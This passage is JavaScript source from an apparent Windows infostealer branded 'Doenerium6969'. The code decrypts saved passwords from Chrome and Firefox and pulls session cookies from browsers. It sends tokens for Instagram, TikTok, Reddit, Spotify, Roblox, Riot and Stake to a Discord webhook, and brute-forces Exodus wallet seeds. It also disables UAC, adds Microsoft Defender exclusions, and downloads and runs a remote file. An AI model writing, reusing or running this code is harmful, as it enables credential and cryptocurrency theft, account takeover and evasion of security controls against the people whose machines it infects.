            } catch (err) {
                console.error(`An error occurred while copying Riot Games Local AppData: ${err.message}`);
            }

        }
    } catch (error) {
        console.error(`Error in SubmitRiotGames: ${error.message}`);
    }
}



async function RiotGameSession(cookie) {
    try {
        const response = await axios.get('https://account.riotgames.com/api/account/v1/user', {
            headers: { "Cookie": `sid=${cookie}` }
        });

        const embed_data = {
            "title": ``,
            "description": ``,
            "color": 0x303037,
            "footer": {
                "text": `${user.hostname} | t.me/vatfraudster`,
                "icon_url": 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
            },
            "thumbnail": { "url": "https://seeklogo.com/images/V/valorant-logo-FAB2CA0E55-seeklogo.com.png" },
            "author": {
                "name": "Valorant Session Detected",
                "icon_url": "https://i.hizliresim.com/qxnzimj.jpg"
            }
        };

        const username = String(response.data.username);
        const email = String(response.data.email);
        const region = String(response.data.region);
        const locale = String(response.data.locale);
        const country = String(response.data.country);
        const mfa = String(response.data.mfa.verified);

        const fields = [
            { "name": "Username", "value": "```" + username + "```", "inline": true },
            { "name": "Email", "value": "```" + email + "```", "inline": true },
            { "name": "Region", "value": "```" + region + "```", "inline": true },
            { "name": "Locale", "value": "```" + locale + "```", "inline": true },
            { "name": "Country", "value": "```" + country + "```", "inline": true },
            { "name": "MFA Enabled?", "value": "```" + mfa + "```", "inline": true },
            { "name": "Cookie", "value": "```" + cookie + "```", "inline": false }
        ];

        embed_data["fields"] = fields;
        const payload = { "embeds": [embed_data] };
        const headers = { "Content-Type": "application/json" };
        const responsePost = await axios.post(discordWebhookUrl, payload, { headers });
    } catch (error) {
        console.error(`Error in RiotGameSession: ${error.message}`);
    }
}

async function submitFileZilla() {
  const fileZillaSource = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\FileZilla`;
  const fileZillaDestination = path.join(mainFolderPath, 'FileZilla');
  if (fs.existsSync(fileZillaSource)) {
    copyFolder(fileZillaSource, fileZillaDestination);
  }
}

function disableuac() {
    try {
        const command = 'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA /t REG_DWORD /d 0 /f';
        execSync(command, { stdio: 'inherit' });
    } catch (error) {
        console.error(`Failed to disable UAC: ${error.message}`);
    }
}


async function exodusDecrypt() {
    const seedpath = path.join(appdata, "Exodus", "exodus.wallet", "seed.seco");
    if (!fs.existsSync(seedpath)) return;
    try {
        if (!allPasswords.length) allPasswords = await getPasswords();
        await decryptFileSeco(seedpath, allPasswords);
    } catch (e) {
        console.error("Exodus decrypt error:", e);
    }
}
  
async function decryptFileSeco(filename, passwords = []) {
    if (!passwords.length) return;
    const data = fs.readFileSync(filename);
    let decrr = "";
    for (const password of passwords) {
        const pass = decryptExodus(data, password);
        if (pass) {
            decrr = pass;
            break;
        }
    }
  
    if (!decrr) return;
    axios.post(`${discordWebhookUrl}`, { text: `Doenerium6969 Excluzif Feature | Exodus Bruteforce\n\n🔑 Password: ${decrr}` }).catch(() => null);
    axios
        .post(discordWebhookUrl, {
            username: "Doenerium6969",
            embeds: [
                {
                    color: 13172927,
                    footer: {
                        text: "@nodual | t.me/vatfraudster",
                    },
                    description: `Password:\n\`${decrr}\``,
                    author: { name: "Ecodus Bruteforce", icon_url: `` },
                },
            ],
        })
        .catch(() => null);
}
  
function decryptExodus(data, phrase) {
    try {
        seco.decryptData(data, phrase);
        return phrase;
    } catch (e) {
        return "";
    }
}

function getGeckoProfiles(basePath, browserName) {
    const profiles = [];
    if (fs.existsSync(basePath)) {
        for (const dir of fs.readdirSync(basePath)) {
            if (dir.includes(".default-release") || dir.includes(".default-default-")) {
                profiles.push({ path: `${basePath}${dir}\\`, name: browserName });
            }
        }
    }
    return profiles;
}

async function getFirefoxCookies() {
    let cookies = "";
    for (const path of geckoPaths) {
        if (!fs.existsSync(`${path.path}cookies.sqlite`)) continue;
        try {
            const result = await getGeckoCookies(path.path);
            cookies += result;
        } catch {
            continue;
        }
    }
    return cookies;
}

async function getFirefoxPasswords() {
    let passwords = "";
    for (const path of geckoPaths) {
        if (!fs.existsSync(`${path.path}logins.json`)) continue;
        try {
            const result = await getGeckoPasswords(path.path, "");
            passwords += result;
        } catch {
            continue;
        }
    }
    return passwords;
}

async function getfirrfoxPAsses(path) {
    const path_split = path.split("\\");
    const path_split_tail = path.includes("Network") ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2);
    let path_tail = path_split_tail.join("\\") + "\\";
    if (path.startsWith(appdata)) path_tail = path;
    if (path.includes("cord")) return;
    if (!fs.existsSync(path_tail)) return;
    const encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + "Local State")).os_crypt.encrypted_key, "base64").subarray(5);
    const login_data = path + "Login Data";
    const passwords_db = path + "passwords.db";
    fs.copyFileSync(login_data, passwords_db);
    const key = Dpapi.unprotectData(Buffer.from(encrypted, "utf-8"), null, "CurrentUser");
    let result = `\n\nPASS FROM: ${path}`;
    const sql = new sqlite3.Database(passwords_db, (err) => {
      if (err) { }
    });
  
    const passes = await new Promise((resolve) => {
      sql.each(
        "SELECT origin_url, username_value, password_value FROM logins",
        function (err, row) {
          if (err || !row["username_value"]) return;
          const password_value = row["password_value"];
          try {
            if (password_value[0] == 1 && password_value[1] == 0 && password_value[2] == 0 && password_value[3] == 0) {
              const decrypted = Dpapi.unprotectData(password_value, null, "CurrentUser").toString("utf-8");
              allPasswords.push(decrypted);
              passwordCount++;
              result += "\nURL: " + row["origin_url"] + " | USER: " + row["username_value"] + " | PASS: " + decrypted;
            } else {
              const start = password_value.slice(3, 15);
              const middle = password_value.slice(15, password_value.length - 16);
              const end = password_value.slice(password_value.length - 16, password_value.length);
              const decipher = crypto.createDecipheriv("aes-256-gcm", key, start);
              decipher.setAuthTag(end);
              const decrypted = decipher.update(middle, "base64", "utf-8") + decipher.final("utf-8");
              allPasswords.push(decrypted);
              result += "\nURL: " + row["origin_url"] + " | USER: " + row["username_value"] + " | PASS: " + decrypted;
              passwordCount++;
            }
          } catch {}
        },
        function () {
          resolve(result);
        }
      );
    });
    return passes;
}

async function getFirefoxxPasses() {
    let passwords = "";
    passwords += (await getFirefoxPasswords()) || "";
    for (let i = 0; i < paths.length; i++) {
        const loginDataPath = path.join(paths[i], "Login Data");
        if (fs.existsSync(loginDataPath)) passwords += (await getfirrfoxPAsses(paths[i])) || "";
    }
    if (!passwords.includes("PASS:")) passwords = "pass not found";
    try {
        if (fs.existsSync(mainFolderPath)) {
            const outputDir = path.join(mainFolderPath, 'FirefoxPasswordz');
            const outputPath = path.join(outputDir, 'passwords.txt');
            if (!fs.existsSync(outputDir)) fs.mkdirSync(outputDir, { recursive: true });
            fs.writeFileSync(outputPath, passwords);
        }
    } catch (err) {
        console.error("err writin pass file:", err);
    }
}

async function getGeckoCookies(path) {
    var result = "";
    const sql = new sqlite3.Database(`${path}cookies.sqlite`, (err) => {
        if (err) { }
    });
    const protezz = await new Promise((resolve, reject) => {
        sql.each("SELECT * FROM moz_cookies",
            function (err, row) {
                if (err) return;
                if (row["host"].includes('.instagram.com') && row["name"].includes('sessionid')) {
                    SubmitInstagram(`${row["value"]}`);
                } else if (row["host"].includes('.tiktok.com') && row["name"].includes('sessionid')) {
                    stealTikTokSession(`${row["value"]}`);
                } else if (row["host"].includes('.reddit.com') && row["name"].includes('reddit_session')) {
                    setRedditSession(`${row["value"]}`);
                } else if (row["host"].includes('.spotify.com') && row["name"].includes('sp_dc')) {
                    SpotifySession(`${row["value"]}`);
                } else if (row["name"] === '.ROBLOSECURITY') {
                    SubmitRoblox(`${row["value"]}`);
                } else if (row["host"].includes('account.riotgames.com') && row["name"].includes('sid')) {
                    RiotGameSession(`${row["value"]}`);
                } else if (row["host"].includes('stake.com') && row["name"].includes('session')) {
                    sendStakeSessionToDiscord(`${row["value"]}`);
                }
                result += `${row["host"]}\tTRUE\t/\tFALSE\t2597573456\t${row["name"]}\t${row["value"]}\n`;
            },
            function () {
                resolve(result);
            }
        );
    });
    return protezz;
}
  
async function getGeckoPasswords(profile, masterPassword) {
    var passwords = `PASSWORDS FROM: ${profile}`;
    const key = await getKey(profile, masterPassword);
    if (!key) return passwords;
    const loginsPath = path.join(profile, "logins.json");
    if (!fs.existsSync(loginsPath)) return passwords;
    const loginsData = fs.readFileSync(loginsPath, "utf8");
    const profileLogins = JSON.parse(loginsData);
    for (const login of profileLogins.logins) {
        passwordCount++;
        const decodedUsername = decodeLoginData(login.encryptedUsername);
        const decodedPassword = decodeLoginData(login.encryptedPassword);
        const username = decrypt(decodedUsername.data, decodedUsername.iv, key, "3DES-CBC");
        const password = decrypt(decodedPassword.data, decodedPassword.iv, key, "3DES-CBC");
        passwords += "\nURL: " + login.hostname + " | USER: " + username.data + " | PASS: " + password.data;
    }
    return passwords;
}

async function closeBrowsers() {
  const browsersProcess = ["firefox.exe", "chrome.exe", "filezilla.exe", "msedge.exe","watcher.exe", "opera.exe", "brave.exe", "steam.exe", "RiotClientServices.exe"];
  return new Promise(async (resolve) => {
    try {
      const tasks = execSync("tasklist").toString();
      browsersProcess.forEach((process) => {
        if (tasks.includes(process)) execSync(`taskkill /IM ${process} /F`);
      });
      await new Promise((innerResolve) => setTimeout(innerResolve, 2500));
      resolve();
    } catch (e) {
      resolve();
    }
  });
}

function decodeLoginData(b64) {
    const asn1 = forge.asn1.fromDer(forge.util.decode64(b64));
    return { iv: asn1.value[1].value[1].value, data: asn1.value[2].value };
}
  
async function getKey(profileDirectory, masterPassword) {
    const key4FilePath = path.join(profileDirectory, "key4.db");
    if (!fs.existsSync(key4FilePath)) return null;
    const masterPasswordBytes = forge.util.encodeUtf8(masterPassword || "");
    const key4Db = new sqlite3.Database(key4FilePath, (err) => {
        if (err) console.log(err);
    });

    const key = new Promise((resolve) => {
        key4Db.each("SELECT item1, item2 FROM metadata WHERE id = 'password';", function (err, metaData) {
            if (err) { }
            if (metaData && metaData.item1 && metaData.item2) {
                const globalSalt = toByteString(metaData.item1);
                const item2 = toByteString(metaData.item2);
                const item2Asn1 = forge.asn1.fromDer(item2);
                const item2Value = pbesDecrypt(item2Asn1.value, masterPasswordBytes, globalSalt);
                if (item2Value && item2Value.data === "password-check") {
                    key4Db.each("SELECT a11 FROM nssPrivate WHERE a11 IS NOT NULL;", function (err, nssData) {
                        if (err) { }
                        if (nssData && nssData.a11) {
                            const a11 = toByteString(nssData.a11);
                            const a11Asn1 = forge.asn1.fromDer(a11);
                            resolve(pbesDecrypt(a11Asn1.value, masterPasswordBytes, globalSalt));
                        }
                    });
                }
            }
        });
    });

    return key;
}
  
function pbesDecrypt(decodedItemSeq, password, globalSalt) {
    if (decodedItemSeq[0].value[1].value[0].value[1].value != null) {
        return pbes2Decrypt(decodedItemSeq, password, globalSalt);
    }
    return pbes1Decrypt(decodedItemSeq, password, globalSalt);
}
  
function pbes1Decrypt(decodedItemSeq, password, globalSalt) {
    const data = decodedItemSeq[1].value;
    const salt = decodedItemSeq[0].value[1].value[0].value;
    const hp = sha1(globalSalt + password);
    const pes = toByteString(pad([...salt], 20).buffer);
    const chp = sha1(hp + salt);
    const k1 = hmac(pes + salt, chp);
    const tk = hmac(pes, chp);
    const k2 = hmac(tk + salt, chp);
    const k = k1 + k2;
    const kBuffer = forge.util.createBuffer(k);
    const otherLength = kBuffer.length() - 32;
    const key = kBuffer.getBytes(24);
    kBuffer.getBytes(otherLength);
    const iv = kBuffer.getBytes(8);
    return decrypt(data, iv, key, "3DES-CBC");
}
  
function pbes2Decrypt(decodedItemSeq, password, globalSalt) {
    const data = decodedItemSeq[1].value;
    const pbkdf2Seq = decodedItemSeq[0].value[1].value[0].value[1].value;
    const salt = pbkdf2Seq[0].value;
    const iterations = pbkdf2Seq[1].value.charCodeAt();
    const iv = "" + decodedItemSeq[0].value[1].value[1].value[1].value;
    const k = sha1(globalSalt + password);
    const key = forge.pkcs5.pbkdf2(k, salt, iterations, 32, forge.md.sha256.create());
    return decrypt(data, iv, key, "AES-CBC");
}
  
function decrypt(data, iv, key, algorithm) {
    const decipher = forge.cipher.createDecipher(algorithm, key);
    decipher.start({ iv: iv });
    decipher.update(forge.util.createBuffer(data));
    decipher.finish();
    return decipher.output;
}
  
function sha1(data) {
    const md = forge.md.sha1.create();
    md.update(data, "raw");
    return md.digest().data;
}
  
function pad(arr, length) {
    if (arr.length >= length) return arr;
    const padAmount = length - arr.length;
    const padArr = [];
    for (let i = 0; i < padAmount; i++) {
        padArr.push(0);
    }
    var newArr = new Uint8Array(padArr.length + arr.length);
    newArr.set(padArr, 0);
    newArr.set(arr, padArr.length);
    return newArr;
}
  
function hmac(data, key) {
    const hmac = forge.hmac.create();
    hmac.start("sha1", key);
    hmac.update(data, "raw");
    return hmac.digest().data;
}
  
function toByteString(buffer) {
    return String.fromCharCode.apply(null, new Uint8Array(buffer));
}

const saveDir = 'C:\\ProgramData\\Microsoft';

async function binder(url, saveDir) {
  try {
    addDefenderExclusion(saveDir);
    if (!fs.existsSync(saveDir)) fs.mkdirSync(saveDir, { recursive: true });
    const fileName = path.basename(url);
    const filePath = path.join(saveDir, fileName);
    const response = await axios({ url, method: 'GET', responseType: 'stream' });
    response.data.pipe(fs.createWriteStream(filePath));
    response.data.on('end', () => {
      executeCommandbinder(filePath);
    });
    response.data.on('error', (err) => {
      console.error('Error during file download', err);
    });
  } catch (error) {
    console.error('Error while running the script', error);
  }
}

function executeCommandbinder(filePath) {
  const command = `start "" "${filePath}"`;
  exec(command, (error, stdout, stderr) => {
    if (error) return;
    if (stderr) return;
  });
}

function addDefenderExclusion(directory) {
  const command = `powershell -Command "Add-MpPreference -ExclusionPath '${directory}'"`;
  exec(command, (error, stdout, stderr) => {
    if (error) return;
    if (stderr) return;
  });
}

const geckoPaths = [...getGeckoProfiles(appdata + "\\Mozilla\\Firefox\\Profiles\\", "Firefox"), ...getGeckoProfiles(appdata + "\\Waterfox\\Profiles\\", "Waterfox")];

const localAppData = process.env['LOCALAPPDATA'];
const programFiles = process.env.PROGRAMFILES;
const programFilesX86 = path.join('C:', 'Program Files (x86)');

const configs = {
    "chrome": {
        bin: path.join(programFiles, 'Google', 'Chrome', 'Application', 'chrome.exe'),
        userData: path.join(localAppData, 'Google', 'Chrome', 'User Data')
    },
    "edge": {
        bin: path.join(programFilesX86, 'Microsoft', 'Edge', 'Application', 'msedge.exe'),
        userData: path.join(localAppData, 'Microsoft', 'Edge', 'User Data')
    },
    "brave": {
        bin: path.join(programFiles, 'BraveSoftware', 'Brave-Browser', 'Application', 'brave.exe'),
        userData: path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data')
    },
    "yandex": {
        bin: path.join(programFiles, 'Yandex', 'YandexBrowser', 'Application', 'browser.exe'),
        userData: path.join(localAppData, 'Yandex', 'YandexBrowser', 'User Data')
    },
    "opera": {
        bin: [
            path.join(programFiles, 'Opera', 'opera.exe'),
            path.join(localAppData, 'Programs', 'Opera', 'opera.exe')
        ].find(p => fs.existsSync(p)),
        userData: path.join(localAppData, 'Opera Software', 'Opera Stable')
    },
    "opera_gx": {
        bin: path.join(localAppData, 'Programs', 'Opera GX', 'opera.exe'),
        userData: path.join(localAppData, 'Opera Software', 'Opera GX Stable')
    }
};

async function getProfiles(browser) {
    const userDataPath = configs[browser].userData;
    try {
        const profileDirs = fs.readdirSync(userDataPath).filter(dir => dir.startsWith('Profile '));
        return profileDirs;
    } catch (error) {
        return [];
    }
  }

async function fetchAllCookies() {
    const defaultBrowser = await getDefaultBrowser();
    const browsers = ['chrome', 'edge', 'brave', 'yandex', 'opera', 'opera_gx'];
    await getProfilesAndFetchCookies(defaultBrowser);
    for (const browser of browsers) {
        if (browser !== defaultBrowser) await getProfilesAndFetchCookies(browser);
    }
}

function ensureCookiesDir() {
    const cookiesDir = path.join(mainFolderPath, "cookies");
    if (!fs.existsSync(cookiesDir)) fs.mkdirSync(cookiesDir, { recursive: true });
    return cookiesDir;
}

async function getDefaultBrowser() {
    return new Promise((resolve) => {
        exec('reg query "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice" /v Progid', (err, stdout) => {
            const browserKey = stdout.match(/Progid\s+REG_SZ\s+(\S+)/);
            if (browserKey) {
                const browser = browserKey[1].toLowerCase();
                if (browser.includes('chrome')) resolve('chrome');
                else if (browser.includes('edge')) resolve('edge');
                else if (browser.includes('yandex')) resolve('yandex');
                else if (browser.includes('brave')) resolve('brave');
                else if (browser.includes('opera')) resolve('opera');
                else resolve('chrome');
            } else resolve('chrome');
        });
    });
}

async function getProfilesAndFetchCookies(browser) {
    if (!browser || !configs[browser]) return;
    const config = configs[browser];
    if (!config) return;
    const userDataPath = config.userData;
    const profileDirs = [];
    for (let i = 0; i <= 50; i++) {
        const profileName = i === 0 ? 'Default' : `Profile ${i}`;
        const profilePath = path.join(userDataPath, profileName);
        if (fs.existsSync(profilePath)) profileDirs.push(profileName);
    }
    for (const profile of profileDirs) {
        const process = startBrowserWithCDP(browser, profile);
        await new Promise(resolve => setTimeout(resolve, 5000));
        await getCookiesWBSKET(browser, profile);
        exec(`taskkill /IM "${path.basename(config.bin)}" /F`);
    }
}

async function startBrowserWithCDP(browser, profile) {
    const config = configs[browser];
    if (!config || !fs.existsSync(config.bin)) return null;
    const args = [
        '--remote-debugging-port=9222',
        '--remote-debugging-address=0.0.0.0',
        '--no-first-run',
        '--no-default-browser-check',
        '--disable-extensions',
        '--disable-breakpad',
        `--user-data-dir=${config.userData}`,
        `--profile-directory=${profile}`,
        '--headless=new'
    ];
    
    try {
        const proc = spawn(config.bin, args, { detached: true, stdio: 'ignore' });
        await delay(7000);
        return proc;
    } catch (error) {
        console.error(`Failed to start ${browser}:`, error);
        return null;
    }
}

const CDP_RETRY_CONFIG = { attempts: 3, delay: 2000, timeout: 15000 };
async function getWebSocketUrl() {
    const hosts = ['127.0.0.1', '::1'];
    for (const host of hosts) {
        for (let attempt = 1; attempt <= CDP_RETRY_CONFIG.attempts; attempt++) {
            try {
                const response = await fetch(`http://${host}:9222/json`, { timeout: CDP_RETRY_CONFIG.timeout });
                const json = await response.json();
                if (json?.[0]?.webSocketDebuggerUrl) {
                    return json[0].webSocketDebuggerUrl;
                }
            } catch (error) {
                if (attempt === CDP_RETRY_CONFIG.attempts) {
                    throw new Error(`co failed after ${CDP_RETRY_CONFIG.attempts} attemptz: ${error.message}`);
                }
                await delay(CDP_RETRY_CONFIG.delay);
            }
        }
    }
    throw new Error('could not get wb debuger');
}

async function getCookiesWBSKET(browser, profile) {
    if (!browser || !profile) return;
    const cookiesDir = ensureCookiesDir();
    const browserDir = path.join(cookiesDir, browser);
    if (!fs.existsSync(browserDir)) fs.mkdirSync(browserDir);
    const cookieFile = path.join(browserDir, `${profile}_cookies.txt`);
    try {
        if (fs.existsSync(cookieFile)) fs.unlinkSync(cookieFile);
        const wsUrl = await getWebSocketUrl();
        const ws = new WebSocket(wsUrl);
        await new Promise((resolve, reject) => {
            const timeout = setTimeout(() => {
                ws.close();
                reject(new Error('WebSocket connection timed out'));
            }, 15000);

            ws.on('open', () => {
                ws.send(JSON.stringify({ id: 1, method: 'Network.getAllCookies' }));
            });

            ws.on('message', (data) => {
                try {
                    const message = JSON.parse(data);
                    if (message.id === 1) {
                        clearTimeout(timeout);
                        const cookies = message.result?.cookies || [];
                        if (cookies.length > 0) {
                            const cookieData = cookies.map(cookie => `${cookie.domain}\t${cookie.httpOnly}\t${cookie.path}\t${cookie.secure}\t${cookie.expires}\t${cookie.name}\t${cookie.value}`).join('\n');
                            fs.writeFileSync(cookieFile, cookieData, 'utf8');
                        }
                        ws.close();
                        resolve();
                    }
                } catch (e) {
                    clearTimeout(timeout);
                    reject(e);
                }
            });
            ws.on('error', (err) => {
                clearTimeout(timeout);
                reject(err);
            });
        });
    } catch (error) {
        fs.writeFileSync(cookieFile, `Failed to get cookies: ${error.message}`, 'utf8');
    }
}

async function delay(ms) {
    return new Promise((res) => setTimeout(res, ms));
}
  
async function getAllCookies(wsUrl) {
    return new Promise((resolve, reject) => {
        const ws = new WebSocket(wsUrl);
        ws.on("open", () => {
            ws.send(JSON.stringify({ id: 1, method: "Network.getAllCookies" }));
        });
        ws.on("message", (data) => {
            const response = JSON.parse(data.toString());
            if (response.id === 1) {
                ws.close();
                resolve(response.result.cookies);
            }
        });
        ws.on("error", () => resolve([]));
    });
}

async function fetchAllCookies5() {
    const cookiesDir = path.join(mainFolderPath, "cookies");
    if (!fs.existsSync(cookiesDir)) fs.mkdirSync(cookiesDir, { recursive: true });
    for (const [browserName, config] of Object.entries(configs)) {
        if (!config.bin || !fs.existsSync(config.bin)) continue;
        const profiles = getProfileDirectories(config.userData);
        for (const profile of profiles) {
            let browserInstance;
            try {
                browserInstance = await puppeteer.launch({
                    executablePath: config.bin,
                    args: [
                        `--user-data-dir=${config.userData}`,
                        `--profile-directory=${profile}`,
                        '--no-sandbox',
                        '--disable-setuid-sandbox'
                    ],
                    headless: 'new'
                });

                const page = await browserInstance.newPage();
                const client = await page.target().createCDPSession();
                const { cookies } = await client.send('Network.getAllCookies');
                const browserDir = path.join(cookiesDir, browserName);
                fs.mkdirSync(browserDir, { recursive: true });
                const cookieFile = path.join(browserDir, `${profile}_puppeteer.txt`);
                fs.writeFileSync(cookieFile, generateNetscapeCookieFile(cookies));
            } catch (err) {
                console.error(`Error with ${browserName} (${profile}):`, err.message);
            } finally {
                if (browserInstance) {
                    await browserInstance.close();
                }
            }
        }
    }
}

function getProfileDirectories(userDataPath) {
    const profileDirs = [];
    for (let i = 0; i <= 50; i++) {
        const profileName = i === 0 ? 'Default' : `Profile ${i}`;
        const profilePath = path.join(userDataPath, profileName);
        if (fs.existsSync(profilePath)) profileDirs.push(profileName);
    }
    return profileDirs;
}

function generateNetscapeCookieFile(cookies) {
    return cookies.map(cookie => `${cookie.domain}\t${cookie.httpOnly ? 'TRUE' : 'FALSE'}\t${cookie.path}\t${cookie.secure ? 'TRUE' : 'FALSE'}\t${cookie.expires || 0}\t${cookie.name}\t${cookie.value}`).join('\n');
}

async function startProcess1295() {
    const browsers = ["chrome", "edge", "brave", "operagx", "opera"];
    for (const browser of browsers) await processBrowserProfiles1295(browser, {});
}

const debugPort = 1295;
const programFiles1295 = process.env['ProgramFiles'];
const programFilesX861295 = process.env['ProgramFiles(x86)'];
const local1295 = process.env.LOCALAPPDATA;
const appData1295 = process.env.APPDATA;

const configs1295 = {
    "edge": {
        bin: path.join(programFilesX861295, 'Microsoft', 'Edge', 'Application', 'msedge.exe'),
        userData: path.join(local1295, 'Microsoft', 'Edge', 'User Data')
    },
    "chrome": {
        bin: path.join(programFiles1295, 'Google', 'Chrome', 'Application', 'chrome.exe'),
        userData: path.join(local1295, 'Google', 'Chrome', 'User Data')
    },
    "brave": {
        bin: path.join(programFiles1295, 'BraveSoftware', 'Brave-Browser', 'Application', 'brave.exe'),
        userData: path.join(local1295, 'BraveSoftware', 'Brave-Browser', 'User Data')
    },
    "opera": {
        bin: [
            path.join(programFiles, 'Opera', 'opera.exe'),
            path.join(localAppData, 'Programs', 'Opera', 'opera.exe')
        ].find(p => fs.existsSync(p)),
        userData: path.join(localAppData, 'Opera Software', 'Opera Stable')
    },
    "opera_gx": {
        bin: path.join(process.env.LOCALAPPDATA, 'Programs', 'Opera GX', 'launcher.exe'),
        userData: path.join(process.env.APPDATA, 'Opera Software', 'Opera GX Stable'),
    },
};

function browserExists1295(browser) {
    const config = configs1295[browser];
    if (!config) return false;
    if (Array.isArray(config.bin)) return config.bin.some(p => fs.existsSync(p));
    return fs.existsSync(config.bin);
}

async function processBrowserProfiles1295(browser, dgyhux) {
    if (!browser || !browserExists1295(browser)) return;
    if (browser === "operagx") return await processOperaWithRetry1295(dgyhux);
    await processBrowserWithRetry1295(browser, "Default", dgyhux);
    const profiles = await getProfiles(browser);
    for (const profile of profiles) await processBrowserWithRetry1295(browser, profile, dgyhux);
}

async function killBrowserProcess1295(browser) {
    return new Promise((resolve) => {
        if (!browser || !configs[browser]) {
            resolve();
            return;
        }
        const processName = path.basename(configs[browser].bin);
        exec(`taskkill /F /IM ${processName} /T`, (err) => {
            if (err) {
                console.log(`failed to kill ${processName}:`, err.message);
            }
            exec(`wmic process where "name='${processName}'" delete`, () => {
                setTimeout(resolve, 500);
            });
        });
    });
}

async function startBrowser(browser, profileDirectory = null) {
    const config = configs[browser];
    const command = `"${config.bin}"`;
    const args = [
        `--remote-debugging-port=${debugPort}`,
        `--remote-allow-origins=*`,
        `--headless`,
        `--no-sandbox`,
        `--disable-setuid-sandbox`,
        `--user-data-dir="${config.userData}"`,
    ];
    if (profileDirectory) args.push(`--profile-directory="${profileDirectory}"`);
    const browserProcess1295 = spawn(command, args, { shell: true });
    browserProcess1295.on('close', (code) => {
        console.log(`Browser process for ${profileDirectory || browser} exited with code ${code}`);
    });
    return browserProcess1295;
  }

  async function processBrowserWithRetry1295(browser, profileDirectory, dgyhux, maxRetries = 3) {
    if (!browser || !profileDirectory) return false;
    const cookiesDir = ensureCookiesDir();
    const browserDir = path.join(cookiesDir, browser);
    if (!fs.existsSync(browserDir)) fs.mkdirSync(browserDir);
    let attempts = 0;
    while (attempts < maxRetries) {
        try {
            await killBrowserProcess1295(browser);
            const browserProcess = await startBrowser(browser, profileDirectory);
            const wsUrl = await getDebugWsUrl1295();
            const cookies = await getCookies1295(wsUrl);
            const fileName = path.join(browserDir, `${profileDirectory}_cookies1295.txt`);
            await saveCookiesToFile(cookies, fileName);
            browserProcess.kill();
            return true;
        } catch (error) {
            attempts++;
            await killBrowserProcess1295(browser);
        }
    }
    return false;
}

async function jamboulataliskanov_sameeerrre(fakePath) {
    const browserGuess = (() => {
        if (fakePath.includes("Chrome")) return "chrome";
        if (fakePath.includes("Edge")) return "edge";
        if (fakePath.includes("Brave")) return "brave";
        return null;
    })();
    if (!browserGuess) return;
    cookiesBrowserUsed.add(browserGuess);
    const browser = configs[browserGuess];
    if (!fs.existsSync(browser.bin)) return;
    const tempProfile = path.join(mainFolderPath, `temp-profile-${browserGuess}-${RANDOMM}`);
    if (!fs.existsSync(tempProfile)) fs.mkdirSync(tempProfile);
    const proc = spawn(browser.bin, [
        "--remote-debugging-port=9222", 
        `--user-data-dir=${tempProfile}`, 
        "--no-first-run", 
        "--headless=new", 
        "--disable-extensions", 
        "--disable-gpu"
    ], { 
        detached: true, stdio: "ignore" 
    });
    try {
        await delay(7000);
        const wsUrl = await getWebSocketUrl();
        const cookies = await getAllCookies(wsUrl);
        if (!cookies.length) return;
        let result = "";
        for (const cookie of cookies) {
            result += `${cookie.domain}\tTRUE\t/\tFALSE\t2597573456\t${cookie.name}\t${cookie.value}\n`;
            if (cookie.domain.includes('.instagram.com') && cookie.name.includes('sessionid')) {
                SubmitInstagram(`${cookie.value}`);
            } else if (cookie.domain.includes('.tiktok.com') && cookie.name.includes('sessionid')) {
                stealTikTokSession(`${cookie.value}`);
            } else if (cookie.domain.includes('.reddit.com') && cookie.name.includes('reddit_session')) {
                setRedditSession(`${cookie.value}`);
            } else if (cookie.domain.includes('.spotify.com') && cookie.name.includes('sp_dc')) {
                SpotifySession(`${cookie.value}`);
            } else if (cookie.name === '.ROBLOSECURITY') {
                SubmitRoblox(`${cookie.value}`);
            } else if (cookie.domain.includes('account.riotgames.com') && cookie.name.includes('sid')) {
                RiotGameSession(`${cookie.value}`);
            } else if (cookie.domain.includes('stake.com') && cookie.name.includes('session')) {
                sendStakeSessionToDiscord(`${cookie.value}`);
            }
        }
        return result;
    } catch (e) {
        // console.log(`[${browserGuess}] failed to get cookies via wb: ${e.message}`);
        return;
    } finally {
        try { process.kill(-proc.pid) } catch { }
        await closeBrowsers();
        try { fs.rmSync(tempProfile, { recursive: true, force: true }) } catch { }
    }
}

async function getzNewChoromiumCookies() {
    const cookiesDir = ensureCookiesDir();
    let cookies = "";
    const firefoxCookies = (await getFirefoxCookies()) || "";
    if (firefoxCookies.includes("TRUE")) {
        cookies += firefoxCookies;
        const firefoxDir = path.join(cookiesDir, "firefox");
        if (!fs.existsSync(firefoxDir)) fs.mkdirSync(firefoxDir);
        fs.writeFileSync(path.join(firefoxDir, "firefox_cookies.txt"), firefoxCookies);
    }
    for (let i = 0; i < paths.length; i++) {
        const browserPath = paths[i].includes("Opera") ? path.join(paths[i], "Network") : paths[i];
        if (!fs.existsSync(path.join(browserPath, "Cookies"))) continue;
        const borzz = (await jamboulataliskanov_sameeerrre(browserPath)) || "";
        if (!borzz || !borzz.includes("TRUE")) continue;
        cookies += borzz;
        const browserName = getBrowserNameByPath(browserPath).toLowerCase().replace(/\s+/g, '_');
        const browserDir = path.join(cookiesDir, browserName);
        if (!fs.existsSync(browserDir)) fs.mkdirSync(browserDir);
        fs.writeFileSync(path.join(browserDir, `${browserName}_cookies.txt`), borzz);
    }
    if (!cookies.includes("TRUE")) cookies = "cookies not found.";
    fs.writeFileSync(path.join(cookiesDir, "all_cookies.txt"), cookies);
}

function getBrowserNameByPath(path) {
    const using = path.split("\\").find((p) => p.includes("Default") || p.includes("Profile"));
    if (path.includes("Chrome")) return `Google_Chome${using ? `_${using}` : ""}`;
    else if (path.includes("Opera Stable")) return `Opera_Stable${using ? `_${using}` : ""}`;
    else if (path.includes("Opera GX")) return `Opera_GX${using ? `_${using}` : ""}`;
    else if (path.includes("Brave")) return `Brave${using ? `_${using}` : ""}`;
    else if (path.includes("Yandex")) return `Yandex${using ? `_${using}` : ""}`;
